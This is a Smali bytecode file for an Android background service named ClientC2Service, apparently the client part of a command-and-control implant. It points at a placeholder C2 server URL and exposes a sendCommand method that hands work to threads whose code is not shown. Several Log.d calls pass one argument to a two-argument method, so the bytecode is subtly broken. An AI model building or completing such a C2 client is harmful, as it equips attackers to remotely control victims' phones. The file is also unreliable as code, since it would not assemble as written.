.class public Lcom/smilex/client/services/ClientC2Service;
.super Landroid/app/Service;
.source "ClientC2Service.java"

.field private static final TAG:Ljava/lang/String; = "ClientC2Service"
.field private static final C2_SERVER_URL:Ljava/lang/String; = "http://your_c2_server.com/api/"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .registers 2
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    const-string v0, "ClientC2Service created"
    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    .param p1, "intent"
    .param p2, "flags"
    .param p3, "startId"

    const-string v0, "ClientC2Service started"
    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/smilex/client/services/ClientC2Service$1;
    invoke-direct {v1, p0}, Lcom/smilex/client/services/ClientC2Service$1;-><init>(Lcom/smilex/client/services/ClientC2Service;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    const/4 v0, 0x1
    return v0
.end method

.method public onDestroy()V
    .registers 2
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    const-string v0, "ClientC2Service destroyed"
    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public static sendCommand(Ljava/lang/String;Ljava/lang/String;)V
    .registers 5
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/smilex/client/services/ClientC2Service$2;
    invoke-direct {v1, p0, p1}, Lcom/smilex/client/services/ClientC2Service$2;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method

.method static synthetic access$000()Ljava/lang/String;
    .registers 1
    sget-object v0, Lcom/smilex/client/services/ClientC2Service;->C2_SERVER_URL:Ljava/lang/String;
    return-object v0
.end method

.method static synthetic access$100()Ljava/lang/String;
    .registers 1
    sget-object v0, Lcom/smilex/client/services/ClientC2Service;->TAG:Ljava/lang/String;
    return-object v0
.end method
